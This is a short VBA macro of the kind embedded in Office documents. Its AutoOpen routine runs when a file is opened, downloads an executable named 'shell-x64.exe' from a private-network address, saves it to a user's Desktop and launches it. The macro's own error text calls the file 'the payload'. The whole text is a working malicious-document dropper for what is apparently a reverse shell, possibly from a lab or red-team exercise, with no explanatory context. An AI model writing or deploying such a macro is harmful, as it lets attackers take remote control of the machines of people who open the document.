Sub AutoOpen()
    Dim objHTTP: Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    Dim objStream: Set objStream = CreateObject("ADODB.Stream")
    Dim strFileURL, strHDLocation
    
    strFileURL = "http://192.168.122.1:3000/shell-x64.exe"
    strHDLocation = "C:\Users\finn\Desktop\shell-x64.exe"
    
    objHTTP.Open "GET", strFileURL, False
    objHTTP.Send
    
    If objHTTP.Status = 200 Then
        objStream.Open
        objStream.Type = 1 ' Binary
        objStream.Write objHTTP.ResponseBody
        objStream.SaveToFile strHDLocation, 2 ' Overwrite
        objStream.Close
        
        Shell strHDLocation, vbNormalFocus
    Else
        MsgBox "Error downloading the payload", vbCritical
    End If
End Sub

